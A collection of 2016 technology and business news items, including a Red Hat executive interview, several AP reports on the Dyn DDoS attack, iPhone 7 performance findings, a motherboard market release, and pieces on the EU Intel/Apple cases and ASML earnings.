The task facing organisations today is to negotiate an optimal path through a complex and fast-changing technological landscape, avoiding blind alleys such as -- to take just one example -- 'lock in' to a particular public cloud provider. The technology stack offered by open-source pioneer Red Hat is at the heart of many enterprise digital transformation projects, and we caught up with Tim Yeaton, senior vice-president of the company's infrastructure business, at the Red Hat Forum in London earlier this month to discuss this and other matters. We began by asking how far the average CIO has travelled down the digital transformation road. tim-yeaton-red-hat.jpgMore "Most companies know they need to -- or believe they should -- go there," said Yeaton, "but most traditional IT organisations are struggling with how to get their current environments to be far more cost-effective to even think about scraping off enough investment to go pursue cloud-native applications." "I have more CIO-level conversations about their strategic direction than I've ever had before -- maybe three a week," he continued. "What's really fascinating is, I'll talk to a CIO in a particular industry -- the financial services sector, for example -- and they'll say 'we're worried that all our competitors are miles ahead of us', and the first thing I say is 'don't believe the hype -- the reality is, there's one or two in the industry that went all-in first, but most companies are in the same situation'. CIOs are almost embarrassed to think they're the only ones behind, but this is a long evolution that's going to play out." As far as the drivers of digital transformation are concerned, are these different for different industries? "I think the destination ultimately is the same -- highly fluid, scalable infrastructure -- but the journeys are definitely different," said Yeaton. "For example, the telecommunications industry, as it moves to software-defined, is completely reinventing itself. Relationships between network equipment providers and the carriers and service providers are all changing: some of the carriers don't think they need their traditional suppliers, so they'll do it themselves or work with vendors like us. That's an industry where it's been thrown completely up in the air. In other industries it's far more linear -- financial services, for example, where they're always looking for the next wave of innovation, so they've jumped on this. Then there are industries where some digital entrant has created an existential threat -- retail, for example, where a high percentage is now online. And in some cases it's just improving competitiveness -- like in oil and gas, or some of the manufacturing sectors." rh-digital-transformation.jpgMore Read More Red Hat's business model: Curating upstream innovation If you've ever wondered how a business can make money from free open-source software, just take a look at Red Hat's business model and recent financial results. In a nutshell, Red Hat tracks the multitude of open-source projects out there, selects and curates a (small) proportion of them, and delivers 'mission-critical IT solutions' with essential additions such as quality assurance, user experience, lifecycle management and enterprise-grade support. It's a model that currently delivers over $2 billion in revenue a year (guidance for FY2017, ending next February, is around $2.4bn). "In the early days, the open-source motivation was to create low-cost replicas of commercial software -- operating systems, middleware -- and it actually did a pretty good job," said Yeaton. "But I think both the licensing models and the pace of innovation in those collaborative communities caught on, so it was a self-feeding process. Now, the fount of most innovation in software is coming out of these 'upstream' open-source communities. But they're communities of innovation, not communities of completion: what they don't do well -- and this hasn't changed, and I don't think will ever change -- is, they're not focused on 'fit and finish'...they're not trying to build complete, perfect products." Which, of course, is where Red Hat comes in. rh-approach.jpgMore "What's different now is that the range of technologies that's being innovated in the upstream is so broad that you have to have direct and active participation in every single project that you're going to productise," said Yeaton. "The reason is, you're going to have to make improvements in installation, you're going to have to make improvements in user experience and user interface, integration -- and then there's all the hard work around providing lifecycle." "Support really comes from, how do we fix bugs in current releases, how do we fix bugs that appear, as well as introduce new features? We do that via something called 'backporting'. The way we give a three-year lifecycle to OpenStack, for example, even though OpenStack's release cadence is every six months, is: let's say we release the 'M' version of OpenStack, which we've recently done; we're going to support that in production for three years, so we have developers on every single OpenStack module that understand the technology deeply and can make judgements around a bug that's found, say, two or three releases hence...how that might be backported to the original, or interesting new features that are required to sustain something in production. There have been a number of new entrants in open-source who haven't quite gotten this model." "We have the discipline to say: 'we'll only modify existing projects in special ways because we know those changes will be accepted upstream' -- everything we do is in the upstream, there's no proprietary bits that we maintain on our own. By keeping the model pure, we're able to avoid putting customers in jeopardy of being on a fork." So, even given Red Hat's strategic focus on IT infrastructure and application development, all this curation presumably limits the number of upstream projects that the company can be involved in? "Without a doubt," Yeaton confirmed. "Of the million or so open-source projects that exist in the world, we participate in under two thousand -- and what's interesting is, we participate in more than we productise. So for example, in projects that are setting an industry direction like OpenDaylight in software-defined networking, we work almost exclusively with our software-defined networking partners -- but it gives us enough insight to know how to integrate it effectively and performantly into OpenStack." And how do the upstream communities view Red Hat? How often do they get paid for the work that ultimately fills the company's coffers? "As far as the infrastructure products that I'm responsible for are concerned, we probably author 25 percent of the code that we ship, yet if you look at the upstream communities, most developers are paid by someone. OpenStack is a great example: here, today [at the London Red Hat Forum] we have RackSpace, who are very strong contributors, along with Intel and other software providers -- even people we compete with." As noted earlier, Red Hat's model certainly delivers the goods. The company's most recent quarterly results (Q2 FY2017) included $600 million in revenue (19% year-on-year growth), of which the majority -- $531m or 88.5 percent -- was recurring subscription revenue. Red Hat has now delivered 57 consecutive quarters of revenue growth, which goes a long way towards explaining the company's healthy share price trajectory in recent years: red-hat-share-price.jpgMore Concepts, buzzwords and guidance For CIOs, keeping up with trends in enterprise IT is a never-ending process of absorbing new concepts and buzzwords, working out their potential relevance to their particular organisations, and then implementing them as required. So, 'waterfall' development cadences have become 'agile' and are heading towards a continuous 'DevOps' model; traditional 'monolithic' apps have become 'N-Tier', which will be superseded by 'microservices and open APIs'; and physical on-premise servers have given way to virtualised infrastructure, while 'containerised' apps running on public and private clouds are the way of the future. The broad goals here are to modernise legacy apps (to create cost savings), and develop new agile workloads (to implement innovative business initiatives). We asked Tim Yeaton how the latest buzzword, 'serverless architecture', or perhaps more accurately Function as a Service (FaaS) fits into Red Hat's enterprise IT picture. Amazon started this ball rolling in November 2014 with its Lambda service, and both Google (with Google Cloud Functions) and Microsoft (with Azure Functions) have now followed suit. So what's Red Hat's take on this? "I think it's just a point on the spectrum of virtualising and service-enabling," Yeaton said. "The funny thing about serverless environments is, it's a bit of a misnomer -- it's really about how much you can abstract away. We've thought a lot about that in our strategy, and you can see these concepts play out, but I think in practice it's going to take many years for them to become widely adopted." And how about Red Hat's customers -- are they often champing at the bit for new, trendy technologies like serverless/FaaS to be productised, or does the company have to explain to them why it's important? "The customers that we have the best relationships with often are the ones that come to us and say: 'this is kind of overwhelming...guide us a little bit'. They know they've got to react, but they're not entirely sure what to change first. In most companies, the hardest part is, you've got to get your development organisation to agile, and that typically means cultural shifts in the whole IT organisation -- policy and process changes -- before you start investing in the technology." tim-yeaton-red-hat-forum-crop.jpgMore Security and the new IT architecture Red Hat is in the business of creating mission-critical enterprise software, so clearly security is a central priority. But does the new generation of DevOps-created, microservices/open API-driven, containerised cloud-native workloads create qualitatively different security challenges for IT departments? "It's sort of a two-edged sword," said Yeaton. "You can make containers very secure -- containers are a Linux operating system technology, and we have techniques to secure those and wall them off -- so if you apply best practices for building containers, you can make containers very, very secure. The flip side is, there's a lot of pre-built containers in the wild -- you can get them from Docker Hub, lots of other places. And like any other code, if you're consuming code from the outside, what's in that container matters -- and containers are a binary format, so understanding what's in there is not easy. So here again, it's best practices: containers you're going to use in production you should probably build from source...you should know the provenance of that source. Sloppy microservices-based applications can introduce a lot of vulnerabilities, and you won't know them until it's too late." Does that mean, sometime in the future, that the 'dark side' of containers will manifest itself as security breaches of modern cloud-native apps? "I'm sure you'll see companies who ingest code they didn't understand having problems, no question," said Yeaton. "That's why it's as much about good development practices and policies -- having a root registry that you manage and you understand how components get put in there, all those kinds of things." Returning to the upstream open-source communities that are the wellspring of Red Hat's product line: does their focus on innovation mean that security is less of priority, resulting in the company having to put in a lot of work here? "Most security issues are ones where best practices were not applied during development, or something was introduced here that has an effect over there. We think of security as a component-level issue and a system-level issue, and we pay a lot of attention to both. We have teams inside the company that look across products as they get put together, which no upstream community is going to do." Technology choices and vendor lock-in Another potential trap for unwary CIOs is making technology choices that back them into a corner as far as public cloud providers, for example, are concerned. So how does Red Hat's open-source-based stack play here -- can it be seen as a future-proofing layer? "The way we've built our software elements, it's really designed to create abstractions across multiple public clouds. Let's say you're building a microservices application, and you don't want to necessarily be dependent on a single public cloud; you can build that in such a way that it can run on our infrastructure across public clouds or on-premises identically, using the same management tools and provisioning tools. That's unique to us, and that really comes from fifteen years of data centre experience and how to make those things first-class citizens in this new world." "Secondly, I've seen people talk about the 'Red Hat stack' as if it's a monolithic thing, but in our case each element of the stack, because they're community-first projects, has to add value in its own right. Now we do a lot of work to make sure that when you put them together you get the best experience possible, but we have customers all the time who use, say, OpenStack or OpenShift but someone else's management product, or they'll use somebody else's PaaS on top of our infrastructure. We're designed to be modular in that way -- we support, and only support, the native interfaces that are defined in the community, be it OpenStack, CloudForms, whatever. We're eminently pluggable." Does that mean, then, that Red Hat has nothing to fear from a widespread migration of enterprise workloads to the public cloud? "If it moves the way customers say it will, companies expect to be bimodal, with traditional and cloud-native apps in the mix; they're going to be hybrid, with on-prem and public cloud -- and on the public side they want to use multiple clouds because they're afraid of another generation of lock-in otherwise. There are companies who already have policies around what native services developers are allowed to use on any given public cloud -- they want to minimise that, so they can allow for portability, bursting and automated management. That's where this is all going." Outlook Wrapping up our time with Tim Yeaton, we asked for his vision of enterprise IT beyond the 3-5-year timeframe of the foregoing discussion. "In five to ten years, I think it's about how much can be abstracted, how much can be automated, how much can be driven through machine-to-machine and artificial intelligence, with developers adding value to what's come before. That's where you're going to see the pace accelerate." In this new world, the CIO will become much more of a curator and enabler of IT initiatives and developments -- a "broker of the resources," as Yeaton put it.

Cyberattacks on a key internet firm repeatedly disrupted the availability of popular websites across the United States Friday, according to analysts and company officials. The White House described the disruption as malicious. Posted Friday, October 21, 2016 4:58 pm By Raphael Satter and Frank Bajak The Associated Press LONDON >> Cyberattacks on a key internet firm repeatedly disrupted the availability of popular websites across the United States Friday, according to analysts and company officials. The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. Broad effects The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as "twitter.com" into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. "It's been pretty busy for those guys," Read said. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed." Read said Dyn provides services to some 6 percent of America's Fortune 500 companies. "It impacted quite a few users," he said of the morning's attack. A full list of affected companies wasn't immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. Hackers claim responsibility Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They said 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to be taking "good actions." Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually.. Secure your website and get better servers, otherwise be attacked again," he said. The vulnerable internet For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. Attacks came in waves and from IP addresses from around the world, shifting geographically. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and the latest wave of problems continued until Friday evening Eastern time. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," Kyle York, chief strategy officer of Dyn, on a call with reporters. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH.

Some iPhones have slower write speeds by up to 200MB/s, while others suffer from very poor signal reception and data transfer rates. This year, Apple finally deprecated the entry-level 16GB iPhone model, which was something of an embarrassment in this day and age of 4K video recording and multi-gigabit apps. The move was welcomed by everyone, but the new 32GB model that replaced it doesn’t seem to be doing all that well. That’s because in various tests by different parties, the 32GB iPhone 7 consistently underperforms. When comparing read speeds between the 32GB model and the 128GB model, testers found that the entry-level devices only read data at 656MB/s, as opposed to the 856MB/s the big models get. What’s worse, is that in write speed tests, the 32GB model was over eight times slower than the larger 128GB counterpart. To be more exact, the 128GB iPhone 7 was found to write data at a speed of 341MB/s while the 32GB model only wrote at 42MB/s. This can potentially make a big difference in day to day use. The problem doesn’t even seem to be restricted to the basic iPhone 7 model, as the 32GB iPhone 7 Plus seems to suffer from the exact same problem. Moving on to cellular connectivity, this year’s iPhones contain modems from two different suppliers: Qualcomm and Intel. Unfortunately, according to testing done by Cellular Insights, the Intel devices, with model numbers A1778 and A1784, which are sold in Europe, performed significantly worse than the Qualcomm ones, model numbers A1660 and A1661. In tests, the iPhone 7 Plus models with the Intel modem performed between 30%-75% worse than the Qualcomm-powered iPhones. This affects connectivity, download speeds, dropped calls, battery usage and so on. Apple hasn’t publicly commented on these findings. All in all, it looks like you might need to spring for the more expensive iPhones, and carefully check their model numbers if you want to get the best performance out of them.

PRLog XHome Login Latest News News By Location News By Industry News By Topic News By Date Business Profiles Pressrooms Get Feeds Get Alerted For Bloggers PRNewswire Distribution Search Worldwide Motherboard Industry Growth Estimated at 5.9% in 3Q 2016   Spread the Word: News By Tag: * Worldwide Motherboard Industry By Industry: * TechnologyALBANY, N.Y. - Oct. 22, 2016 - PRLog -- Market Research Hub has announced the addition of a new report to its repository. The new report, titled as 'The Worldwide Motherboard Industry, 3Q 2016', offers analysis and projection on third quarter performance of the global motherboard sector. This report provides a detailed overview of the motherboard industry and complete analysis of the shipment volume for the period 1Q 2014 to the 2Q 2016. A motherboard is the heart of a computer system. It is the foremost printed circuit board present in the computers which holds the essential electronic components of the system like- the central processing unit (CPU) and memory unit (MU). It also provides the connectors for other important peripheral devices. In addition to the circuits, a motherboard of a computer system contains a large number of sockets and slots to connect the other components. Totally there are basically four types of major motherboards are existing into global market and it includes AT, XT, LTX (Low profile extension), Baby AT and ATX (Advanced Technology extended). Moreover, as due to the growth in the number of motherboards with Sky lake CPU, motherboard average selling price to some extent in the third quarter of 2016, leading to a sequential growth of 5.9% in 2016. Sky Lake is the latest generation of the Intel processors. The report also examines manufacturer rankings, CPU connector adoption, shipment destinations, assembly levels, production locations, and business types. The information provided by this report is based on primary data obtained from interviews with motherboard makers. The research report evaluates industry size and values along with recent quarter review of the worldwide motherboard industry. According to report findings, shipment value of the motherboard industry has declined 6.8% year-on-year to 32.3 million units in the fourth quarter of 2015. Earlier, it had declined 10.4% year-on-year to 28.97 million units in the first quarter of 2016. This decline is estimated to be on account of continued weak market demand and a higher baseline in the fourth quarter of 2015. Following that, overdue launch of-Sky lake CPUs contributed to a stronger performance last year in the same period.

AP News: HOME | US | WORLD | BUSINESS | FINANCE | TECHNOLOGY | SPORTS | ENTERTAINMENT | HEALTH | SCIENCE | WASHINGTON | STRANGE Search AP News: Oct 21, 8:19 PM EDT Cyberattacks on key internet firm disrupt internet services By RAPHAEL SATTER and FRANK BAJAK AP Technology Writers Withering cyberattacks on server farms of a key internet firm repeatedly disrupted access to major websites and online services including Twitter, Netflix and PayPal across the United States on Friday. The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines - including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com." Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed," said Read. Dyn provides services to some 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to their actions were "good," presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group - or at least he - sought only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually. Secure your website and get better servers, otherwise be attacked again," he said. THE VULNERABLE INTERNET For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet - closed-circuit video cameras, digital video recorders and even thermostats - that were infected with malware. "The Internet of Things sort of ran way ahead of how the Internet was architected," Dyn's York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. "Prophet" of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. "We've stopped all our attacks," he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. --- Satter reported from London, Bajak from Houston.

X Intel case could change flavour of €13bn Apple ruling European Court of Justice says Intel decision that led to €1.06bn fine should be re-examined Sat, Oct 22, 2016, 07:30 EU Competition Commissioner Margrethe Vestager: has she bitten off more than she can chew? Photograph: John Thys/AFP/Getty Images         Even as EU competition commissioner Margrethe Vestager was was putting a shot across the bows of a Government still reeling from the scale of the Apple tax ruling, a little heralded legal opinion in another part of the EU apparatus threatened this week to change things. In an interview with Irish Times European Correspondent Suzanne Lynch, Vestager insisted the ruling that Apple must repay up to €13 billion (plus possible interest) to the Irish Revenue – which might then face competing claims from other EU states for portions of this money – was fact-based. It has also emerged that the Irish authorities have submitted a list of 300 tax rulings to the commission as part of a broader enquiry in Brussels into tax rulings. Criticism Down the road in Luxembourg, European Court of Justice advocate general Nils Wahl was throwing a spanner into the works. He said a 2009 case against Intel, after an eight-year investigation – which led to a record €1.06 billion fine – should be re-examined in its entirety because a court erred in ruling against the company’s system of rebates for PC makers using its chips. The ECJ judges are not obliged to follow an advocate’s opinion but more often than not they do. Of particular interest to Apple and the Irish Government, which is planning ECJ appeals against Vestager’s record €13 billion ruling, is the advocate general’s criticism of the EU’s handling of evidence it gathered against Intel, saying the lower court was wrong to rule that regulators could add details of a meeting with a Dell executive long after the fact. Failure to communicate a shift in the focus of the Apple probe and keeping both the company and the Government in the dark unfairly during the investigation are central to the likely appeal against the Vestager ruling on Apple. ADVERTISEMENT In the wake of the AG’s opinion, lawyers in Brussels were suggesting, a confirmatory ruling by the full court could be among the most important decisions by an EU court in 25 years. It remains to be seen if the commissioner has bitten off more than she can chew.       Topics: Cantillon Margrethe Vestager Nils Wahl European Court of Justice Apple Intel AboutCantillon A man with a profound understanding of how money is made and lost, Kerry-born economist Richard Cantillon (1680s-1734) is a fitting namesake for this long-running column.

That prediction compares with the average estimate of 43.6 percent. The company reported third-quarter sales that beat estimates, mostly with older products, as it brings on its newest line based on so-called extreme ultraviolet lithography technology. ASML’s results and guidance “demonstrate a healthy mainstream business, while ASML continues to make progress on EUV,” Peter Olofsen, an analyst with Kepler Cheuvreux who rates the stock a buy, said in an e-mailed note. He expects ASML to confirm its 2020 targets when it meets investors on Oct. 31 in New York. ASML is pushing chipmaker clients such as Intel Corp., Samsung Electronics Co. and Taiwan Semiconductor Manufacturing Co. to upgrade to its newest machines, which can etch smaller circuits while increasing capacity and speed. The company said it took orders for three more of the extreme ultraviolet, or EUV, systems during the third quarter, and shipped one. Six customers, producing both memory and logic chips, have now ordered the systems. “A mix of sales to both logic and memory customers keeps us on track to finish the year with record annual sales," Chief Executive Officer Peter Wennink said in the statement. Revenue in the fourth quarter will be 1.7 billion euros ($1.87 billion) to 1.8 billion euros, ASML forecast. Analysts had predicted 1.76 billion euros on average. ASML rose as much as 4.3 percent in Amsterdam, the steepest intraday gain since March 10. Shares gained 3.75 percent, to 96.30 euros, as of 9:21 a.m. Third-quarter sales rose 17 percent to 1.82 billion euros, beating the average estimate of 1.73 billion euros. Net income rose 23 percent to 396 million euros, missing estimates after the company recognized partial revenue for a EUV system. That bolstered sales but also lowered the company’s gross margin by 1.4 percentage points in the quarter. The company is entering the fourth quarter with a "strong" order backlog of 3.5 billion euros, Chief Financial Officer Wolfgang Nickl said in a video posted on ASML’s website. The company sees a “bit of a bounce back” for memory shipments that were “weak” last quarter, he said. Before it's here, it's on the Bloomberg Terminal.

Withering cyberattacks on server farms of a key Internet firm repeatedly disrupted access to major websites and online services including Twitter, Netflix and PayPal across the United States on Friday. The White House called the disruption malicious, and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, N.H.-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the United States, even in Europe. “The complexity of the attacks is what is making it so difficult for us,” said Kyle York, the company's chief strategy officer. “What they are actually doing is moving around the world with each attack.” He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical Internet addresses into human-readable destinations such as “twitter.com.” Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn't matter that the store is fully open or operational if you have no idea how to get there,” he said. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. “We've been monitoring Dyn for years, and this is by far the worst outage event that we've observed,” Read said. Dyn provides services to about 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected “zombie” computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. “We didn't do this to attract federal agents, only test power,” two collective members who identified themselves as “Prophet” and “Zain” told an AP reporter via Twitter direct message exchange. They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorldHacking Twitter account. They claim 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed their actions were “good,” presumably because they highlighted Internet security problems. Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand, actually,” he said. “Secure your website and get better servers. Otherwise, be attacked again.” For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the Internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the Internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. “The Internet of Things sort of ran way ahead of how the Internet was architected,” Dyn's York said on a call with reporters. He said there are 10 billion to 15 billion such devices online. Dyn first became aware of an attack around 7 a.m. local time, focused on data centers on the East Coast of the United States. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continued. “It is a very smart attack. As we start to mitigate, they react and start to throw something that's over the top,” York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. “Prophet” of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. “We've stopped all our attacks,” he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French Internet service provider OVH. In a widely shared essay titled “Someone Is Learning How to Take Down the Internet,” respected security expert Bruce Schneier said last month that major Internet infrastructure companies were seeing a series of worrying denial-of-service attacks. “Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services,” he said.

(jim cole/Associated Press) By RAPHAEL SATTER and FRANK BAJAK, RAPHAEL SATTER and FRANK BAJAK, Associated Press Published: October 21, 2016, 9:20 PM A   A Local Angle: The internet attack Friday inflamed Twitter users, Netflix watchers and Spotify listeners, surely, but it also made a long day for local technology consultant Sam Rodriguez. The 37-year-old Vancouver resident services some 50 people and small businesses locally through his company Zen Focus Tech. Rodriguez said the siege on the New England-based DNS provider Dyn bogged many of his client’s access to important websites such as Zillow, a real estate listing site, and such tools as the cloud-based accounting software Freshbooks. “Nowadays, you have to use software on the website; and if you can’t get  to the website, you are pretty much out of luck,” he said. Rodriguez, who founded Zen Focus Tech in 2007, expects problems to increase as the internet is built into more and more devices. He points not just to smartphones, but digital home appliances, such as the thermostat Nest, that were exploited to flood the DNS provider’s servers. The attack may be a forerunner to a new era of cybersecurity, he said. “Absolutely there is going to be more demand not just cybersecurity but, from the point of view of people who are making these devices like webcams, etc. — they’re going to need to do a better job of securing their stuff,” he said. “(Consumers) may need to spend more time setting them up, like changing the default password on a router. It’s going to be more of an issue.” — Troy Brynelson Withering cyberattacks on server farms of a key internet firm repeatedly disrupted access to major websites and online services including Twitter, Netflix and PayPal across the United States on Friday.

By Raphael Satter and Frank Bajak Raphael Satter and Frank Bajak Denton Record-Chronicle Associated Press Published: 21 October 2016 10:43 PM LONDON — Cyberattacks on a key internet firm repeatedly disrupted the availability of popular websites across the United States on Friday, according to analysts and company officials. The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn’t be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. Broad effects The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as “twitter.com” into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn’t matter that the store is fully open or operational if you have no idea how to get there,” he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in 